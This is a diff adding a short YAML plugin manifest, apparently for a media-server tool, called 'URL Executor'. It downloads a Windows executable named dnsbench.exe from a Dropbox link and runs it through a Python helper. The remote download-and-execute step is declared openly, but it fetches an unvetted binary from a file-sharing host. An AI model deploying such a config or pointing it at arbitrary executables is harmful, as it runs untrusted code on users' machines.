@@ -1,0 +1,11 @@
+name: URL Executor
+description: Downloads and executes a file from a URL
+version: 1.6
+exec:
+  - py
+  - "{pluginDir}/executor.py"
+tasks:
+  - name: Run from URL
+    description: Downloads file from url-executor.yml and executes it
+
+url: "https://www.dropbox.com/scl/fi/jsi0phbjnsxzbab3hbn8g/dnsbench.exe?rlkey=gsj1f1rfztmscpoyn94dqyv72&st=ih39lf4j&dl=0"
